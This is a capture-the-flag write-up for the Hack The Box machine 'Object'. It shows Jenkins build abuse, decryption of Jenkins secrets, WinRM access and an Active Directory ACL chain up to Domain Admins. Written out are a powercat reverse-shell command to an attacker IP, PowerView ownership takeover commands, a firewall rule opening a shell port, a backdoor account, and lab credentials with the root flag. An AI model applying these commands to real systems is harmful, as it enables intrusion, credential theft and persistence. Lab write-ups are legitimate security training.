# HTB Machine 014100A1= Object

![image.png](image.png)

Machine 014100A1= [Object](https://app.hackthebox.com/machines/Object/information) 

WINDOWS  HARD

T

About Object

Object is a hard Windows machine running Jenkins automation server. The automation server is found to have registration enabled and the registered user can create builds. Builds can be triggered remotely by configuring an api token. Foothold is obtained by decrypting the Jenkins secrets. The foothold user is found to have `ForceChangePassword` permissions on another user called `smith`. This privilege abuse allows us to gain access to `smith`. `smith` has `GenericWrite` permissions on `maria`. Abusing this privilege allows us to gain access to the server as this user. `maria` has `WriteOwner` permissions on `Domain Admins` group, whose privileges we exploit to get a SYSTEM shell.

Categories
Top Level categories for Object
Vulnerability Assessment Web Application Enterprise Network
Area of Interest
Learn about the technology and tools that can be found in Object
Active Directory Security Tools Authentication
Vulnerabilities
Learn about the vulnerabilities and systems that can be found in Object
Clear Text Credentials Misconfiguration

Jenkins automation server - remotely trigger builds and bash into the build console to retrieve jenkins credentials and decrypt them using github jenkins decoder. 

Foothold - moving from oliver account to login to windows rm, search with bloodhound to discover write permissions that allow us 3 more lateral movements to get to SYSTEM shell via domain admins group. 

## Summary of Vulnerabilities:

Windows Hard 

---

A critical security breach in outdated Jenkins automation server allows remote code execution, credential theft, and local privilege escalation to SYSTEM. 

---

Jenkins

CVE-2024-23897 (Critical): Jenkins CLI allows arbitrary file reads resulting in RCE (Australian Signals Directorate, 2024). 

CVE-2024-23898 (High): WebSocket Hijacking in the CLI resulting in execution of CLI commands (Australian Signals Directorate, 2024). 

Jenkins Secrets Exposure: Credentials and keys stored in accessible directories. 

Jenkins Default Admin Credentials: admin:admin accessible, allowing command execution via automation builds. 

WinRM Enabled for Exploitation: Enabled allowing lateral movments and priviledge escalation. 

Misconfigured Permissions in Active Directory: Attack chain permissions enabled escalation from local users to Domain Admin resulting in system compromise. 

Data Exfiltration & Persistence: Modification of data, security policies, logs, WriteOwner permissions allowing for creation of high priviledge users for persistence and backdoors. 

Credential Dumping: Potential kerberoating and domain credential attacks resulting in persistence. 

---

### Exploitation Process:

Identify Open Ports & Services with nmap scan 

fast initial scan `sudo nmap <target ip>`

sudo nmap -sC -sV -p- -v -oN nmap_full_scan.txt <TARGET_IP>

Connect via openvpn 

Ping target to ensure connection

Enumeration: 

Initial fast nmap scan reveals port 80 and 8080 are open. 

![image.png](image%201.png)

More agressive scan reveals: 

![image.png](image%202.png)

### **Open Ports and Services**

1. **Port 80 (HTTP) - Microsoft IIS 10.0**
    - IIS 10.0 running on **Windows Server 2016 or later**.
    - `http-methods` potentially risky methods reveal **TRACE is enabled** potentially useful for debugging.
    - Could have potential vulnerabilities like **web exploits, misconfigurations, or leaked credentials**.
2. **Port 8080 (HTTP) - Jetty 9.4.43.v20210629**
    - Jetty: highly scalable and memory-efficient web server and servlet container, supporting many protocols such as HTTP/3,2,1 and WebSocket. [https://jetty.org/index.html](https://jetty.org/index.html)
    - 
    - Supports **HTTP/HTTPS** and **WebSockets**.
    - Often used as an **embedded server** in Java applications.
    - Used by **Jenkins, Eclipse IDE, Hadoop, and more**.
    - This is likely the **Jenkins automation server** where we can **register a user and create builds**.
    - Jenkins often has **weak authentication or exposed API tokens** that we can exploit.
    - Jetty CVE exploits [https://www.cvedetails.com/version/945911/Eclipse-Jetty-9.4.43.html](https://www.cvedetails.com/version/945911/Eclipse-Jetty-9.4.43.html)
3. **Port 5985 (WinRM) - Microsoft HTTPAPI 2.0**
    - **Windows Remote Management (WinRM)** is enabled.
    - If we get valid credentials, we can **remotely execute commands** using tools like `evil-winrm`.
    - Could be useful for **privilege escalation** later.

Navigating to 10.129.96.147 gives us Mega Engines

![image.png](image%203.png)

[http://10.129.96.147:8080/](http://10.129.96.147:8080/login?from=%2F)

![image.png](image%204.png)

Jenkins: https://www.jenkins.io/

**Build great things at any scale**

The leading open source automation server, Jenkins provides
hundreds of plugins to support building, deploying and automating
any project.

Running Jenkins 2.317

![image.png](image%205.png)

Jenkins Vulns : https://www.jenkins.io/security/advisory/2024-01-24/

https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/multiple-vulnerabilities-jenkins-products

Background / What has happened?

ASD’s ACSC is tracking multiple vulnerabilities impacting Jenkins products which could result in Remote Code Execution and Cross-site WebSocket hijacking.

CVE-2024-23897 refers to a Critical vulnerability in the command line interface command parser allowing attackers to read arbitrary files on the Jenkins controller file system, resulting in possible Remote Code Execution.

CVE-2024-23898 refers to a High Severity vulnerability which enables cross-site WebSocket Hijacking in the command line interface, resulting in the potential for threat actors to execute CLI commands on the Jenkins controller.

ASD’s ACSC is also tracking CVE-2024-23899, CVE-2024-23900, CVE-2024-23901, CVE-2024-23901, 2024-23902, 2024-23903, CVE-2023-6148, CVE-2023-6147, CVE-2024-23905 and CVE-2024-23904 affecting Jenkins products.

A full list of affected versions can be found in Jenkins Customer Advisory.

ASD’s ACSC is aware of reporting of active exploitation of both vulnerabilities.
Mitigation / How do I stay secure?

Organisations should review their networks for use of vulnerable Jenkins Products and upgrade to Jenkins 2.442 or LTS 2.426.3.

https://www.exploit-db.com/

Let’s create an account and have a look around. 

![image.png](image%206.png)

Initial exploration reveals an admin user 

![image.png](image%207.png)

User ID: admin, Name: admin

Test access to builds and jobs, to gain any priviledge or reverse shell. 

![image.png](image%208.png)

![image.png](image%209.png)

Configure, generate API token 

11bd0eef9afe2803996909eabd3e9b3137

curl [http://usertest:11bd0eef9afe2803996909eabd3e9b3137@10.129.96.147:8080/job/testproject/build?token=test](http://usertest:11bd0eef9afe2803996909eabd3e9b3137@10.129.96.147:8080/job/testproject/build?token=test)

Job triggered via curl 

![image.png](image%2010.png)

Did not trigger build properly… tried adjusting the token to our actual token and to schedule the build every minute… with cron job syntax success!

curl [http://usertest:11bd0eef9afe2803996909eabd3e9b3137@10.129.96.147:8080/job/testproject/build?token=11bd0eef9afe2803996909eabd3e9b3137](http://usertest:11bd0eef9afe2803996909eabd3e9b3137@10.129.96.147:8080/job/testproject/build?token=11bd0eef9afe2803996909eabd3e9b3137)

![image.png](image%2011.png)

![image.png](image%2012.png)

[https://crontab.guru/#1_*_*_*_*](https://crontab.guru/#1_*_*_*_*)

![image.png](image%2013.png)

We can successfully see the console output running on user ‘Oliver’ with our command `whoami`

![image.png](image%2014.png)

Can we create a reverse shell with this ‘Execute Windows Batch Command’ Build option in configure? 

![image.png](image%2015.png)

![image.png](image%2016.png)

![image.png](image%2017.png)

Curl troubleshooting returns Failed to connect, bad access. 

This could be due to firewalls and filtering issues… 

Let’s see if we can find out anything from the user Oliver. 

![image.png](image%2018.png)

![image.png](image%2019.png)

Let’s use the path in the console logs… and then lets try users to get some data on oliver. 

![image.png](image%2020.png)

![image.png](image%2021.png)

Within the admin we’ve got a config.xml, we can read this by adjusting our cmd to include type. 

<username>oliver</username>
<password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>

![image.png](image%2022.png)

Visible in the config.xml is user olivers password. 

https://www.jenkins.io/doc/developer/security/secrets/

Jenkins password/sensitive file paths. 

### Encryption of Secrets and Credentials

Jenkins uses AES to encrypt and protect secrets, credentials, and their respective encryption keys.
These encryption keys are stored in `$JENKINS_HOME/secrets/` 
along with the master key used to protect said keys.
This directory should be configured so that only the operating system 
user the Jenkins controller is running as has read and write access to 
this directory (i.e., a `chmod` value of `0700` or using appropriate file attributes).
The master key (sometimes referred to as a "key encryption key" in cryptojargon) is stored *unencrypted* on the Jenkins controller filesystem in `$JENKINS_HOME/secrets/master.key` which does not protect against attackers with direct access to that file.
Most users and developers will use these encryption keys indirectly via either the [Secret](https://javadoc.jenkins.io/byShortName/Secret)
 API for encrypting generic secret data or through the credentials API.
For the cryptocurious, Jenkins uses AES in cipher block chaining (CBC) 
mode with PKCS#5 padding and random IVs to encrypt instances of [CryptoConfidentialKey](https://javadoc.jenkins.io/byShortName/CryptoConfidentialKey) which are stored in `$JENKINS_HOME/secrets/` with a filename corresponding to their `CryptoConfidentialKey` id.
Common key ids include:

- `hudson.util.Secret`: used for generic secrets;
- `com.cloudbees.plugins.credentials.SecretBytes.KEY`: used for some credentials types;
- `jenkins.model.Jenkins.crumbSalt`: used by the [CSRF protection mechanism](https://www.jenkins.io/doc/book/managing/security/#cross-site-request-forgery); and
- `org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY`: used to identify the Jenkins controller.

There are also some other folders of interest we can look into here… 

Within the folder secrets we’ve got a master.key 

`cmd.exe /c "dir c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key”`

![image.png](image%2023.png)

`cmd.exe /c type "c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key”`

![image.png](image%2024.png)

master.key: 

f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

![image.png](image%2025.png)

save config.xml and master.key and hudson.util.Secret onto local machine, using vim

![image.png](image%2026.png)

hudson.util.Secret is encoded so we need to run: 

`powershell.exe -Command "$c=[convert]::ToBase64String((Get-Content -Path 'C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding Byte)); Write-Output $c"`

![image.png](image%2027.png)

Now we can try and decypt! with jenkins github decryptor. 

[https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py](https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py)

![image.png](image%2028.png)

![image.png](image%2029.png)

Olivers password: c1cdfun_d2434

Ok now lets see if we can access WinRM via Olivers credentials

![image.png](image%2030.png)

![image.png](image%2031.png)

![image.png](image%2032.png)

User flag achieved on Olivers desktop via WinRM 

By enumerating the winrm shell we can see some users 

![image.png](image%2033.png)

![image.png](image%2034.png)

Looks like 

![image.png](image%2035.png)

We’re gonna grab SharpHound to enumerate this further. 

**About BloodHound**

BloodHound is a single page Javascript web application, built on top of [Linkurious](http://linkurio.us/), compiled with [Electron](http://electron.atom.io/), with a [Neo4j](https://neo4j.com/) database fed by a C# data collector.

BloodHound uses graph theory to reveal the hidden and 
often unintended relationships within an Active Directory or Azure 
environment. Attackers can use BloodHound to easily identify highly 
complex attack paths that would otherwise be impossible to quickly 
identify. Defenders can use BloodHound to identify and eliminate those 
same attack paths. Both blue and red teams can use BloodHound to easily 
gain a deeper understanding of privilege relationships in an Active 
Directory or Azure environment.

[https://github.com/SpecterOps/BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy)

![image.png](image%2036.png)

![image.png](image%2037.png)

![image.png](image%2038.png)

![image.png](image%2039.png)

![image.png](image%2040.png)

![image.png](image%2041.png)

ForceChangePassword on user smith, to maria to domain admin. 

![image.png](image%2042.png)

![image.png](image%2043.png)

![image.png](image%2044.png)

Owned user Smith, Smith has GenericWrite permissions on user Maria. Generic Write access grants you the ability to write to any non-protected attribute on the target object, including “members” for a group, and “servicePrincipalNames” for a user. [https://bloodhound.specterops.io/resources/edges/generic-write](https://bloodhound.specterops.io/resources/edges/generic-write)

![image.png](image%2045.png)

Permisson denied for the same password reset attack we did on smith. 

![image.png](image%2046.png)

Unable to add maria to admin users 

![image.png](image%2047.png)

![image.png](image%2048.png)

kerboroasting also not successful. 

![image.png](image%2049.png)

Let’s try loading our ip into powercat script to try and get a reverse shell 

listening on our attacking machine using ncat 

need to upload netcat and powercat script to our winrm 

then we can use powercat script to create the reverse shell 

wget [https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)
echo 'powercat -c 192.168.255.129 -p 1234 -e cmd' >> powercat.ps1

![image.png](image%2050.png)

![image.png](image%2051.png)

![image.png](image%2052.png)

Can’t get this to work…. 

[https://www.thehacker.recipes/ad/movement/dacl/logon-script#logon-script](https://www.thehacker.recipes/ad/movement/dacl/logon-script#logon-script) 

hacker recipes suggests it is achieveable… 

Rather than a remote shell let’s see if we can copy any of marias files to see if we can find any credentials… 

Write a script that will copy the desktop files to start with… 

upload this script via winrm to the color directory. 

![image.png](image%2053.png)

![image.png](image%2054.png)

Let’s just try these out manually as there’s only 3 passwords under chamber username maria 

![image.png](image%2055.png)

We know user maria has WriteOwner permissions on the domain. 

If a user has WriteOwner permissions they can change the ownership of the group to themselves, in this case the owner of Domain Admins allowing admin access. We can use Set-DomainObjectOwner to set maria to owner of the group. 

Upload PowerView to maria to enable cmds

If an attacker finds that they have `WriteOwner`
 rights over a group, they can change the ownership of the group to 
themselves. This is particularly impactful when the group in question is
 `Domain Admins`, as changing ownership allows 
for broader control over group attributes and membership. The process 
involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.

[https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=writeowner#writeowner-on-group](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=writeowner#writeowner-on-group)

![image.png](image%2056.png)

![image.png](image%2057.png)

Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
net group "Domain Admins" maria /add /domain

Once we login again under marias domain admin permissions we have access to the Administrator User

![image.png](image%2058.png)

![image.png](image%2059.png)

Further Enum

![image.png](image%2060.png)

![image.png](image%2061.png)

![image.png](image%2062.png)

![image.png](image%2063.png)

![image.png](image%2064.png)

Run SharpHound again on the admin account to see any more lateral movements, however as this is an htb machine it may not be set up for further exploitation. 

| Privileged Group | Abuse Path | Potential Impact |
| --- | --- | --- |

| **Backup Operators** | Steal NTDS.dit | Full domain compromise |
| --- | --- | --- |

| **Account Operators** | Create/Edit users | Persistence & lateral movement |
| --- | --- | --- |

| **Print Operators** | Install malicious DLL | SYSTEM access on DC |
| --- | --- | --- |

Create a new high priviledge user 

![image.png](image%2065.png)

![image.png](image%2066.png)

Firewall analysis: enabled for domain, private and public. Inbound connecitons blocked. 

![image.png](image%2067.png)

netsh advfirewall firewall add rule name="Allow Reverse Shell" protocol=TCP dir=in localport=4444 action=allow

![image.png](image%2068.png)

[https://www.revshells.com/](https://www.revshells.com/)

Creds: 

smith, william 

smith@object.local

Password123!

oliver 

c1cdfun_d2434

maria, garcia 

maria@object.local

W3llcr4ft3d_4cls

root flag: 

d516926195b35bff26f0ef9a85f2d359

new high priviledge user created 

backdoordomain 

Password123!

![image.png](image%2069.png)